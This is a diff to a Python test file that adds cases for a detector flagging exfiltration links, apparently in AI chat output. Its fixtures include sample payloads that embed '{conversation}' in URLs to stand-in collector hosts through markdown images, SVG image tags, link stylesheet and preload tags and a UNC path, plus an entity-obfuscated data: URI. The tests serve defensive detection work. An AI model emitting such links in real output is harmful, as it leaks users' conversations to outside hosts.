@@ -239,6 +239,9 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<svg><image href='https://collector.test/{conversation}.png'/></svg>", ["exfiltration_query"]),
         ("<svg><feImage xlink:href='https://collector.test/{conversation}.png'/></svg>", ["exfiltration_query"]),
         ("<a xlink:href='https://api.test/users/{id}'>user</a>", []),
+        ("<link rel='stylesheet' href='https://collector.test/{conversation}.css'>", ["exfiltration_query"]),
+        ("<link rel='preload' as='image' href='https://collector.test/{conversation}.png'>", ["exfiltration_query"]),
+        ("<area href='https://api.test/users/{id}'>", []),
         ("![foo [bar](javascript:x)](https://a.test/logo.png)", []),
         ("![see ![inner](https://a.test/{c}.png)](https://a.test/logo.png)", []),
     ],
@@ -260,6 +263,8 @@ def test_exfiltration_link_classes(text: str, expected: list[str]) -> None:
         ("[d](data:text/html,x) ![e](data:image/png;base64,AA)", ["data_uri"]),
         ("![e](data:image/png;base64,AA)", []),
         ("\ud800 [q](https://a.test/?q={d})", ["exfiltration_query"]),
+        ("<a href='da&#9;ta:text/html,hello'>open</a>", ["data_uri"]),
+        ("<img src='\\\\collector.test\\{conversation}.png'>", ["exfiltration_query"]),
     ],
 )
 def test_oversized_text_keeps_image_and_encoded_scheme_checks(tail: str, expected: list[str]) -> None:
